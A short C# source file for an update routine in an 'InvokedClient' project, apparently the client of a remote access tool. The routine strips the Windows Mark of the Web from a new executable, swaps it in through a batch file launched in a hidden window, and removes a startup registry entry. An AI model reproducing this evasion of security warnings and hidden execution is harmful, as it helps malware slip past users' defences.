

using InvokedClient.Config;
using InvokedClient.IO;
using InvokedCommon.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;


namespace InvokedClient.Setup
{
	public class ClientUpdater : ClientSetupBase
	{
		public void Update(string newFilePath)
		{
			FileHelper.DeleteZoneIdentifier(newFilePath);
			string str = FileHelper.HasExecutableIdentifier(File.ReadAllBytes(newFilePath)) ? BatchFile.CreateUpdateBatch(Application.ExecutablePath, newFilePath) : throw new Exception("No executable file.");
			Process.Start(new ProcessStartInfo()
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = str
			});
			if (!Settings.STARTUP)
				return;
			new ClientStartup().RemoveFromStartup(Settings.STARTUPKEY);
		}
	}
}